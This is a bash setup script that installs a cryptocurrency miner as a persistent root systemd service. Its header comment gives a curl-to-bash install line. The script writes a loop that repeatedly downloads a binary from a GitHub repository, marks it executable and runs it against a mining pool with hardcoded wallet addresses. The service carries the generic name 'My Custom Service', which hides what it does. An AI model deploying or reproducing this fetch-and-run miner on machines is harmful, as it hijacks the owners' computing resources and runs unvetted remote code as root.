#!/bin/bash
# curl https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/raptoreum_service.sh|bash
# Step 1: Install necessary dependencies
apt update -y
apt install curl wget git -y

# Step 3: Create the main script
cat << 'EOF' > /usr/local/bin/my_service.sh
#!/bin/sh

# Define the URL and mining parameters
MINER_URL="https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/srb"
POOL_URL="stratum+tcps://stratum-na.rplant.xyz:13382"
WALLET_ADDRESS="YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe"
PASSWORD="m=solo"

# Loop indefinitely
while true; do
    # Download the miner executable
    wget -q "$MINER_URL" -O srb
    if [ $? -ne 0 ]; then
        echo "Failed to download the miner. Retrying in 10 seconds..."
        sleep 10
        continue
    fi

    # Make the miner executable
    chmod +x srb
    if [ $? -ne 0 ]; then
        echo "Failed to make the miner executable. Retrying in 10 seconds..."
        sleep 10
        continue
    fi

    # Run the miner
    echo "Starting the miner..."
    ./srb --algorithm ghostrider --pool stratum-na.rplant.xyz:17056 --tls true --wallet RWZHYbbNjdFPpzzrYpsqWFKb2bcSgyj9y1.rapt --password webpassword=x --keepalive true
    if [ $? -ne 0 ]; then
        echo "Miner crashed or failed. Restarting in 10 seconds..."
        sleep 10
    else
        echo "Miner exited successfully. Restarting in 5 seconds..."
        sleep 5
    fi
done
EOF

# Step 4: Make the main script executable
chmod +x /usr/local/bin/my_service.sh

# Step 5: Create the systemd service file
cat << 'EOF' > /etc/systemd/system/my_service.service
[Unit]
Description=My Custom Service
After=network.target

[Service]
ExecStart=/usr/local/bin/my_service.sh
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

# Step 6: Reload systemd and start the service
systemctl daemon-reload
systemctl start my_service.service
systemctl enable my_service.service

echo "Setup completed! The service is now running and enabled on boot."
